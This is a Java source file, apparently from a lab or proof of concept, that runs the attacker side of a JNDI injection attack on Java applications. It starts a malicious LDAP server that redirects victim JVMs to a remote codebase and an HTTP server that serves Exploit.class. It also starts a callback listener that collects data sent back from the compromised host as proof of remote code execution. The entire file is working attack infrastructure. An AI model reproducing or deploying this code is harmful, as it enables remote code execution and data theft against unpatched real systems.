import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.sun.net.httpserver.HttpServer;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpExchange;

import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.URLDecoder;
import java.nio.file.Files;

public class Attacker {

    static void startLdap(String httpBase) throws Exception {
        InMemoryDirectoryServerConfig cfg = new InMemoryDirectoryServerConfig("dc=example,dc=com");
        cfg.setListenerConfigs(InMemoryListenerConfig.createLDAPConfig("listen", 1389));
        cfg.addInMemoryOperationInterceptor(
            new InMemoryOperationInterceptor() {
                @Override
                public void processSearchResult(InMemoryInterceptedSearchResult result) {
                    try {
                        String base = result.getRequest().getBaseDN();
                        System.out.println("[attacker:ldap] search request received (baseDN=" + base + ") -> pointing victim JVM at " + httpBase + "Exploit.class");
                        Entry e = new Entry(base);
                        e.addAttribute("javaClassName", "Exploit");
                        e.addAttribute("objectClass", "javaNamingReference");
                        e.addAttribute("javaFactory", "Exploit");
                        e.addAttribute("javaCodeBase", httpBase);
                        result.sendSearchEntry(e);
                        result.setResult(new com.unboundid.ldap.sdk.LDAPResult(0, com.unboundid.ldap.sdk.ResultCode.SUCCESS));
                    } catch (Exception ex) { ex.printStackTrace(); }
                }
            }
        );
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(cfg);
        ds.startListening();
        System.out.println("[attacker:ldap] listening on 0.0.0.0:1389");
    }

    static void startFileServer() throws Exception {
        HttpServer s = HttpServer.create(new InetSocketAddress(8000), 0);
        s.createContext("/", new HttpHandler() {
            public void handle(HttpExchange ex) throws java.io.IOException {
                String path = ex.getRequestURI().getPath().replaceFirst("^/", "");
                File f = new File(path);
                System.out.println("[attacker:http] victim JVM is fetching class file: " + path);
                if (!f.exists()) { ex.sendResponseHeaders(404, -1); return; }
                byte[] bytes = Files.readAllBytes(f.toPath());
                ex.sendResponseHeaders(200, bytes.length);
                OutputStream os = ex.getResponseBody();
                os.write(bytes);
                os.close();
            }
        });
        s.start();
        System.out.println("[attacker:http] serving Exploit.class on 0.0.0.0:8000");
    }

    static void startCallback() throws Exception {
        HttpServer s = HttpServer.create(new InetSocketAddress(9001), 0);
        s.createContext("/pwned", new HttpHandler() {
            public void handle(HttpExchange ex) throws java.io.IOException {
                String q = ex.getRequestURI().getQuery();
                String data = "";
                if (q != null && q.startsWith("data=")) {
                    data = URLDecoder.decode(q.substring(5), "UTF-8");
                }
                System.out.println("=====================================================");
                System.out.println(" [attacker:callback] RCE PROOF received from victim:");
                System.out.println(data.replace("\\n", "\n"));
                System.out.println("=====================================================");
                byte[] resp = "ok".getBytes();
                ex.sendResponseHeaders(200, resp.length);
                OutputStream os = ex.getResponseBody();
                os.write(resp);
                os.close();
            }
        });
        s.start();
        System.out.println("[attacker:callback] listening on 0.0.0.0:9001");
    }

    public static void main(String[] args) throws Exception {
        String httpBase = args.length > 0 ? args[0] : "http://attacker:8000/";
        startLdap(httpBase);
        startFileServer();
        startCallback();
        System.out.println("[attacker] all services up. waiting for victim to be exploited...");
    }
}
